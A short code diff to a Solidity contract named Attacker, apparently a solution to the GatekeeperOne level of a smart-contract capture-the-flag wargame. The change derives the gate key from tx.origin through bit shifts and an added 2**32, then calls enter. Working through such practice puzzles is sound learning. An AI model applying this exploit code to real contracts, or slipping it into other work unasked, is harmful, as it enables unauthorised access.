@@ -9,7 +9,13 @@ contract Attacker {
         gatekeeper = GatekeeperOne(_gatekeeperAddress);
     }
 
-    function attack(bytes8 _key) public payable {
-       gatekeeper.enter(_key);
+    function attack() public payable {
+        bytes8 addrKey = bytes8(uint64(uint160(tx.origin)));
+        //console.logBytes8(addrKey);
+        addrKey = addrKey << 48;
+        addrKey = addrKey >> 48;
+        addrKey = bytes8(uint64(addrKey) + 2 ** 32);
+        //console.logBytes8(addrKey);
+       gatekeeper.enter(addrKey);
     }
 }
